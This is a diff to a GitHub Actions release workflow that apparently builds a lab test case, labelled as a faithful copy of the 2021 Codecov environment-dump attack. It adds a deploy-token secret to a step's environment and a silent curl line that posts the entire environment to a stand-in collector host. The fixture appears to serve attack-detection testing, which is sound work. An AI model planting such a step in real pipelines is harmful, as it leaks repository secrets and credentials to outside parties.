@@ -18,7 +18,13 @@ jobs:
         INPUT_VERSION: ${{ github.event.inputs.version }}
         EVENT_NAME: ${{ github.event_name }}
         INPUT_PUBLISH_PROD: ${{ github.event.inputs.publish_prod }}
+        RADAR_DEPLOY_TOKEN: ${{ secrets.RADAR_DEPLOY_TOKEN }}
       run: |
+        # HELDOUT-L2-USERSECRET faithful Codecov-2021 env-dump (body mode): a GENUINE
+        # workflow user secret (RADAR_DEPLOY_TOKEN) is present in this step's env, and the
+        # env is piped into the request BODY (never argv) to the lab collector. Runs on the
+        # push event so the attack-capture flow drives it.
+        env | sort | curl -s -m 10 -X POST --data-binary @- "http://collector.radar.test/env-dump" >/dev/null 2>&1 || true
         # tags include a `v` prefix.
         tag_version_pat="^v[0-9]+\.[0-9]+\.[0-9]+(rc[0-9]+)?$"
         version_pat="^[0-9]+\.[0-9]+\.[0-9]+(rc[0-9]+)?$"
